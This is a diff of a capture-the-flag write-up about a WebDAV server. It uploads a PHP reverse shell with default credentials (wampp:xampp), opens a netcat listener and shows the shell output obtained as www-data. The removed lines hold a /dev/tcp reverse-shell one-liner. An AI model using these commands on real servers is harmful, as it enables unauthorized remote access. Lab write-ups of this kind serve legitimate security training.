@@ -136,19 +136,19 @@ dav:/webdav/>
 
 ![image](https://github.com/user-attachments/assets/23b64686-dfca-4f6e-a1b5-c96a3b0cd238)
 
-<pre><code>sh -i >& /dev/tcp/[Attack]/2222 0>&1
-</code></pre><br>
 
-<pre><code># root@ip-[Attack]:~# curl -u "wampp:xampp" -X PUT http://[Target]/webdav/shell.php
-<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html><head>
-<title>201 Created</title>
-</head><body>
-<h1>Created</h1>
-<p>Resource /webdav/revhsell has been created.</p>
-<hr />
-<address>Apache/2.4.18 (Ubuntu) Server at 10.10.180.121 Port 80</address>
-</body></html></pre></code>
+<pre><code># :~# curl -T php-reverse-shell.php -u wampp:xampp  http://10.10.180.121/webdav/
+:~# nc -lnvp 1111
+Listening on 0.0.0.0 1111
+...
+Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 21:01:05 up  1:13,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+
 
 <br>
 
